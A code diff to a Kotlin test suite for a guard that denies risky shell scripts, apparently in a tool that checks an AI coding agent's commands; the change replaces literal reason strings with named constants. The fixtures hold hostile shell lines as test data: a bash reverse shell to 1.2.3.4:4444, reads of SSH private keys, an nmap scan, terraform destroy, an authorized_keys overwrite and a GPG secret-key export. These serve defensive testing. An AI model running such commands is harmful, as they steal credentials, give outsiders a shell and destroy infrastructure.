@@ -1,6 +1,12 @@
 package dev.lain.claudejb.permission
 
 import dev.lain.claudejb.permission.GuardFixture.bash
+import dev.lain.claudejb.permission.GuardReasonWords.CREDENTIAL_SURFACE
+import dev.lain.claudejb.permission.GuardReasonWords.DESTRUCTIVE
+import dev.lain.claudejb.permission.GuardReasonWords.EXPOSE_SECRETS
+import dev.lain.claudejb.permission.GuardReasonWords.INTRUSION
+import dev.lain.claudejb.permission.GuardReasonWords.NESTED
+import dev.lain.claudejb.permission.GuardReasonWords.UNREADABLE
 import dev.lain.claudejb.permission.SensitiveGuard.Verdict
 import org.junit.jupiter.api.Assertions.assertEquals
 import org.junit.jupiter.api.Assertions.assertTrue
@@ -65,7 +71,7 @@ class ScriptAnalysisTest {
         val s = script("setup.sh", "#!/bin/sh\ncat $home/.ssh/id_rsa\n")
         val reason = why("source ./setup.sh")
         assertEquals(Verdict.DENY, v("source ./setup.sh"))
-        assertTrue(reason.contains("credentials or key material"), reason)
+        assertTrue(reason.contains(CREDENTIAL_SURFACE), reason)
         assertTrue(reason.contains(s.fileName.toString()), reason)
         assertEquals(Verdict.DENY, v("source ./setup.sh"))
     }
@@ -95,14 +101,14 @@ class ScriptAnalysisTest {
     fun `a script that runs an intrusion tool or a reverse shell is caught inside it`() {
         script("recon.sh", "#!/bin/sh\nnmap -sS 10.0.0.0/24\n")
         assertEquals(Verdict.DENY, v("./recon.sh"))
-        assertTrue(why("./recon.sh").contains("intrusion technique"), why("./recon.sh"))
+        assertTrue(why("./recon.sh").contains(INTRUSION), why("./recon.sh"))
 
         script("rev.sh", "#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
         assertEquals(Verdict.DENY, v("./rev.sh"))
 
         script("wipe.sh", "#!/bin/sh\nterraform destroy\n")
         assertEquals(Verdict.DENY, v("./wipe.sh"))
-        assertTrue(why("./wipe.sh").contains("destructive"), why("./wipe.sh"))
+        assertTrue(why("./wipe.sh").contains(DESTRUCTIVE), why("./wipe.sh"))
     }
 
     @Test
@@ -134,7 +140,7 @@ class ScriptAnalysisTest {
     fun `but where that script writes is still judged at every depth`() {
         script("evil.sh", "#!/bin/sh\nmkdir -p build\ncp secret.txt $home/.ssh/authorized_keys\n")
         assertEquals(Verdict.DENY, v("./evil.sh"))
-        assertTrue(why("./evil.sh").contains("credentials or key material"), why("./evil.sh"))
+        assertTrue(why("./evil.sh").contains(CREDENTIAL_SURFACE), why("./evil.sh"))
     }
 
     @Test
@@ -152,7 +158,7 @@ class ScriptAnalysisTest {
         script("c.sh", "#!/bin/sh\ncat $home/.ssh/id_ed25519\n")
         val reason = why("./a.sh")
         assertEquals(Verdict.DENY, v("./a.sh"))
-        assertTrue(reason.contains("credentials or key material"), reason)
+        assertTrue(reason.contains(CREDENTIAL_SURFACE), reason)
     }
 
     @Test
@@ -160,7 +166,7 @@ class ScriptAnalysisTest {
         (0..6).forEach { i -> script("s$i.sh", "#!/bin/sh\nsource ./s${i + 1}.sh\n") }
         assertEquals(Verdict.DENY, v("./s0.sh"))
         assertEquals(Verdict.DENY, v("./s0.sh"))
-        assertTrue(why("./s0.sh").contains("nested deeper"))
+        assertTrue(why("./s0.sh").contains(NESTED))
     }
 
     @Test
@@ -172,7 +178,7 @@ class ScriptAnalysisTest {
     @Test
     fun `a script that does not exist yet is opaque, so it is denied`() {
         assertEquals(Verdict.DENY, v("./not-written-yet.sh"))
-        assertTrue(why("./not-written-yet.sh").contains("could not read"))
+        assertTrue(why("./not-written-yet.sh").contains(UNREADABLE))
     }
 
     @Test
@@ -186,13 +192,13 @@ class ScriptAnalysisTest {
     fun `a script named through a resolvable variable is read, not merely flagged as a variable`() {
         script("run.sh", "#!/bin/sh\ncat $home/.ssh/id_rsa\n")
         val env = mapOf("TOOL" to "$project/run.sh")
-        assertTrue(why("bash \$TOOL", policy(env)).contains("credentials or key material"))
+        assertTrue(why("bash \$TOOL", policy(env)).contains(CREDENTIAL_SURFACE))
     }
 
     @Test
     fun `a write followed by a source is caught at the source, which is the laundering path`() {
         script("staged.sh", "#!/bin/sh\ngpg --export-secret-keys > /tmp/k.asc\n")
         val reason = why("source ./staged.sh")
-        assertTrue(reason.contains("expose secrets") || reason.contains("credentials"), reason)
+        assertTrue(reason.contains(EXPOSE_SECRETS) || reason.contains("credentials"), reason)
     }
 }
